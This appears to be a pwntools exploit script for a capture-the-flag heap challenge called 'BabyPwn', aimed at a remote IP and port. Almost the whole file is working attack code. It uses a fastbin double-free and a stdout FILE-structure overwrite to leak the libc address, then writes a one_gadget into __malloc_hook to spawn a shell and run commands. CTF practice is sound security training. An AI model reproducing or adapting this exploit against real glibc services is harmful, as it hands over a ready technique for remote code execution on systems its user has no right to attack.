#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# # Create a symbol file for GDB debugging
# try:
#     gdb_symbols = '''

#     '''

#     f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
#     f.write(gdb_symbols)
#     f.close()
#     os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
# except Exception as e:
#     print(e)

context.arch = 'amd64'
# context.arch = 'i386'
context.log_level = 'error'
# context.log_level = 'debug'
execve_file = './BabyPwn.bin'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
# sh = process(execve_file)
sh = remote('49.232.101.41', 9999)
elf = ELF(execve_file)
libc = ELF('./libc-2.23.so')

# Create temporary files for GDB debugging
try:
    gdbscript = '''

    '''

    f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    print(e)

def add(name, desc_size, desc):
    sh.sendlineafter('choice:', '1')
    sh.sendafter('name:', name)
    sh.sendlineafter(' size:', str(desc_size))
    sh.sendafter('Description:', desc)

def delete(index):
    sh.sendlineafter('choice:', '2')
    sh.sendlineafter('index:', str(index))

add('\n', 0x68, '\n')
add('\n', 0x68, '\n')

delete(0)
delete(1)
delete(0)

add(p64(0x71) + p16(0x25dd), 0x68, p64(0x60203d))
add('\n', 0x68, '\n')
add('\n', 0x68, '\n')
add('\n', 0x68, 'aaa' + p64(0x602060) + p64(0x51) + p64(0x602040) + p64(0) * 8 + p32(0x81) )
# pause()
# delete(0)

add('\n', 0x68, '\n')
add('\n', 0x68, '\n')
delete(1)
delete(2)
delete(1)
add('\n', 0x68, p64(0x60201d))
add('\n', 0x68, '\n')
add('\n', 0x68, '\n')
add('\n', 0x68, 'bbb' + p64(0) + p64(0x71) + p16(0x25dd))

delete(1)
delete(2)
delete(1)

add('\n', 0x68, p64(0x602030))

# reload
delete(0)
add('\n', 0x48, p64(0x602040) + p64(0) * 8)
add('\n', 0x68, '\n')
add('\n', 0x68, '\n')
add('\n', 0x68, '\n')

add('\n', 0x68, 'c' * 0x33 + p64(0xfbad2887 | 0x1000) + p64(0) * 3 + p8(0x88))
result = sh.recvn(8)
libc_addr = u64(result) - libc.symbols['_IO_2_1_stdin_']
log.success('libc_addr: ' + hex(libc_addr))

main_arena_addr = libc_addr + (libc.symbols['__malloc_hook'] + 0x10)
log.success('main_arena_addr: ' + hex(main_arena_addr))

delete(1)
delete(2)
delete(1)

add('\n', 0x68, p64(main_arena_addr - 0x33))
add('\n', 0x68, '\n')
add('\n', 0x68, '\n')

# reload
delete(0)
add('\n', 0x48, p64(0x602040) + p64(0) * 8)

'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
add('\n', 0x68, 'z' * 0xb + p64(libc_addr + 0x4526a) + p64(libc_addr + libc.symbols['realloc'] + 4))
# pause()
sh.sendlineafter('choice:', '1')

sh.sendline('ls')

sh.interactive()
clear()